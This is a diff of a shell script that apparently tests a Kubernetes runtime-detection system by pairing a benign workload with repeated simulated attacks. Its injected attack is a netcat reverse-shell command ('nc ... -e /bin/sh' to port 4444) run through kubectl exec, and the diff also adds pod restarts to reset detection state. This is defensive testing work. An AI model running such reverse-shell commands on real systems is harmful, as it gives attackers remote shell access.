@@ -80,7 +80,7 @@ log_info "Attack target: $VULN_POD"
 
 # ---- Continuous legitimate workload generator ------------------------------
 log_info "Starting continuous legitimate workload generator..."
-kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true
+kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true --now >/dev/null 2>&1 || true
 kubectl run legit-soak -n ztre-test --image=alpine --restart=Always -- \
     /bin/sh -c 'while true; do ls /tmp >/dev/null 2>&1; sleep 1; done' >/dev/null 2>&1
 kubectl wait --for=condition=Ready pod/legit-soak -n ztre-test --timeout=60s >/dev/null 2>&1 || true
@@ -134,11 +134,13 @@ while true; do
         ATTACK_COUNT=$((ATTACK_COUNT + 1))
         log_warn "Injecting attack #${ATTACK_COUNT} (reverse shell on vulnerable-app)..."
 
-        # Clear prior quarantine so the pod can be re-targeted
-        kubectl label pod "$VULN_POD" -n ztre-test ztre/quarantine- --overwrite >/dev/null 2>&1 || true
+        # Roll out fresh pod so dedup cache key and process tree are clean
+        kubectl rollout restart deployment/vulnerable-app -n ztre-test >/dev/null 2>&1 || true
+        kubectl rollout status deployment/vulnerable-app -n ztre-test --timeout=60s >/dev/null 2>&1 || true
+        VULN_POD=$(kubectl get pod -n ztre-test -l app=vulnerable-app -o jsonpath='{.items[0].metadata.name}')
         sleep 2
 
-        kubectl exec -n ztre-test "$VULN_POD" -- /bin/sh -c 'nc -e /bin/sh 10.91.128.10 4444' >/dev/null 2>&1 || true
+        kubectl exec -n ztre-test "$VULN_POD" -- /bin/sh -c 'nc 10.91.128.10 4444 -e /bin/sh' >/dev/null 2>&1 || true
         LAST_ATTACK=$ELAPSED
         sleep 4
 
@@ -154,7 +156,7 @@ while true; do
 done
 
 # --- Cleanup -----------------------------------------------------------------
-kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true
+kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true --now >/dev/null 2>&1 || true
 
 # --- Analysis ----------------------------------------------------------------
 echo ""
